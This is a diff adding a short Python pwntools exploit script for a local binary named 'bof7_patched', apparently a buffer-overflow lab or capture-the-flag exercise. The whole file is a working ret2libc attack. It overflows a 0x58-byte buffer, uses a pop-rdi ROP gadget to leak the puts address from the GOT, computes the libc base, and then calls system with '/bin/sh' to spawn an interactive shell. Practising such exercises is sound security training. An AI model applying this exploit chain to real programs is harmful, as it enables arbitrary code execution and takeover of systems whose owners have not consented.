@@ -1,0 +1,30 @@
+from pwn import *
+
+p = process("./bof7_patched")
+e = ELF("./bof7_patched")
+libc = ELF("./libc-2.31.so")
+
+puts_plt = e.plt['puts']
+puts_got = e.got['puts']
+main = e.symbols['main']
+pop_rdi = 0x0000000000401263
+ret = pop_rdi + 1
+
+payload = b'A' * 0x50 + b'B' * 0x8
+payload += p64(pop_rdi) + p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+p.sendafter(b"something: \n", payload)
+
+libc_base = u64(p.recv(6) + b'\x00' * 2) - libc.symbols['puts']
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b"/bin/sh"))[0]
+
+payload = b'A' * 0x50 + b'B' * 0x8
+payload += p64(pop_rdi) + p64(binsh)
+payload += p64(ret)
+payload += p64(system)
+p.sendafter(b"something: \n", payload)
+
+p.interactive()
+
